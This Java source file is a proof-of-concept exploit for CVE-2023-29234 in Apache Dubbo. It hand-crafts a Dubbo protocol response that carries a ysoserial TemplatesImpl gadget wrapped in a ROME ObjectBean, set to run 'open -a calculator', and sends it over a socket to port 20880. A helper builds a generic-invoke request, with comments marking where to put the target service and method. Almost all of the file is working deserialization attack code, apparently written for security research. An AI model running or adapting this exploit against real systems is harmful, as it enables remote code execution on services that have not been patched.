package top.lz2y.vul;

import com.sun.syndication.feed.impl.ObjectBean;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Serialization;
import org.apache.dubbo.common.serialize.nativejava.NativeJavaObjectOutput;
import org.apache.dubbo.common.serialize.nativejava.NativeJavaSerialization;
import org.apache.dubbo.remoting.exchange.Response;
import ysoserial.payloads.util.Gadgets;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;

import static org.apache.dubbo.rpc.protocol.dubbo.DubboCodecfake.RESPONSE_WITH_EXCEPTION;

/**
 * @author by RacerZ
 * @date 2023/12/19.
 */
public class CVE202329234 {
    protected static final int HEADER_LENGTH = 16;
    // magic header.
    protected static final short MAGIC = (short) 0xdabb;
    protected static final byte MAGIC_HIGH = Bytes.short2bytes(MAGIC)[0];
    protected static final byte MAGIC_LOW = Bytes.short2bytes(MAGIC)[1];
    // message flag.
    protected static final byte FLAG_REQUEST = (byte) 0x80;
    protected static final byte FLAG_TWOWAY = (byte) 0x40;
    protected static final byte FLAG_EVENT = (byte) 0x20;
    protected static final int SERIALIZATION_MASK = 0x1f;

    public static void main(String[] args) throws Exception {

        ByteArrayOutputStream boos = new ByteArrayOutputStream();
        ByteArrayOutputStream nativeJavaBoos = new ByteArrayOutputStream();
        Serialization serialization = new NativeJavaSerialization();
        NativeJavaObjectOutput out = new NativeJavaObjectOutput(nativeJavaBoos);

        // header.
        byte[] header = new byte[HEADER_LENGTH];
        // set magic number.
        Bytes.short2bytes(MAGIC, header);
        // set request and serialization flag.
        header[2] = serialization.getContentTypeId();
//        header[2] |= FLAG_EVENT;

        header[3] = Response.OK;
        Bytes.long2bytes(1, header, 4);

        // result
//        Serializable object = new CommonsCollections5().getObject("open -a calculator");
//        out.writeObject("racerz");
        Object exp = getThrowablePayload("open -a calculator");
        out.writeByte(RESPONSE_WITH_EXCEPTION);
        out.writeObject(exp);

        out.flushBuffer();

        Bytes.int2bytes(nativeJavaBoos.size(), header, 12);
        boos.write(header);
        boos.write(nativeJavaBoos.toByteArray());

//        byte[] requestDate = getRequest();
        byte[] responseData = boos.toByteArray();

        Socket socket = new Socket("127.0.0.1", 20880);
        OutputStream outputStream = socket.getOutputStream();
//        outputStream.write(requestDate);
        outputStream.write(responseData);
        outputStream.flush();
        outputStream.close();
    }

    protected static Object getThrowablePayload(String command) throws Exception {
        Object o = Gadgets.createTemplatesImpl(command);
        ObjectBean delegate = new ObjectBean(Templates.class, o);

        return delegate;
    }

    protected static byte[] getRequest() throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        ByteArrayOutputStream boos = new ByteArrayOutputStream();
//        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
        NativeJavaSerialization serialization = new NativeJavaSerialization();
        NativeJavaObjectOutput out = new NativeJavaObjectOutput(boos);

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) (FLAG_REQUEST | serialization.getContentTypeId());

        // set request id.
        Bytes.long2bytes(1, header, 4);

        // set body
//        out.writeUTF("xxx");
        out.writeUTF("3.1.5");
        //todo 此处填写Dubbo提供的服务名
        out.writeUTF("top.lz2y.service.DemoService");
        out.writeUTF("");
        out.writeUTF("$invoke");
        out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
        //todo 此处填写Dubbo提供的服务的方法
        out.writeUTF("sayHello");
        out.writeObject(new String[] {"java.lang.String"});

        // normal invoke
        out.writeObject(new Object[] {"hello"});
        HashMap<String, Object> map = new HashMap<>();
        map.put("generic", "raw.return");
        out.writeObject(map);

        out.flushBuffer();

        Bytes.int2bytes(boos.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(boos.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        return bytes;
    }
}
